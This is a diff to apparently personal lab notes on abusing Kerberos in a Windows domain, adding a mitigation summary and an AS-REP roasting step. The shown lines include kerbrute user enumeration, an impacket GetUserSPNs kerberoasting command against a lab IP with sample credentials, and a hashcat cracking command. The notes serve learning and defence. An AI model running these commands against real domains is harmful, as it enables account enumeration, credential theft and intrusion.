@@ -2,6 +2,11 @@
 Learn how to abuse the Kerberos Ticket Granting Service inside of a Windows Domain Controller
 
 6/25/2022
+## Summary:
+
+- Mitigation: Have a strong password policy (hashes will take longer to crack), Don't turn off Kerberos Pre-Authentication unless it's necessary, Don't let your domain admins log onto anything except the domain controller
+
+## Kerbrute
 
 - First, we will use [kerbrute](https://github.com/ropnop/kerbrute/releases) to enumerate the users on the domain
 - `./kerbrute_linux_amd64 userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt`
@@ -40,3 +45,10 @@ Learn how to abuse the Kerberos Ticket Granting Service inside of a Windows Doma
 
 - We can also do this remotely with impacket:
 - `sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.226.161 -request`
+
+## AS-REP Roasting
+`hashcat -m 18200 hash.txt Pass.txt`
+![image](https://user-images.githubusercontent.com/66894542/175791160-c96c6c0d-0f82-410d-9848-11b075671732.png)
+
+
+![image](https://user-images.githubusercontent.com/66894542/175791467-1f365a83-20da-4b67-8c3d-83b749d83e43.png)
